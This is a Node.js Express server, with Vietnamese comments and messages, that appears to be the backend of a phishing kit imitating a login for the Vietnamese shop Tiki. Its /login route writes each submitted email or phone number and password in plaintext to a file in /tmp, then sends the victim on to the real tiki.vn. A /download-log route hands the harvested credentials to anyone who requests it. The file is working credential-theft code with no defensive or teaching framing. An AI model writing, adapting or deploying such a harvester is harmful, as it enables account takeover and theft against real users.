const express = require("express");
const fs = require("fs");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = 3000;
const logFilePath = path.join("/tmp", "login_data.txt");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "public")));

app.post("/login", (req, res) => {
  const { emailOrPhone, password } = req.body;

  if (!emailOrPhone || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Vui lòng nhập đủ thông tin." });
  }

  const logData = `Email/Số điện thoại: ${emailOrPhone}\nMật khẩu: ${password}\n-----------------------------\n`;

  fs.appendFile(logFilePath, logData, (err) => {
    if (err) {
      console.error("Lỗi khi lưu thông tin:", err);
      return res.status(500).json({ success: false, message: "Lỗi server." });
    }
    res.json({
      success: true,
      redirectUrl: "https://tiki.vn/",
    });
  });
});
app.get("/download-log", (req, res) => {
  const logFilePath = path.join("/tmp", "login_data.txt");
  res.download(logFilePath, "login_data.txt", (err) => {
    if (err) {
      return res
        .status(500)
        .json({ success: false, message: "Không thể tải tệp." });
    }
  });
});

// Route mặc định trả về trang login
app.get("/some-path", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Chạy server trên port 3000
app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
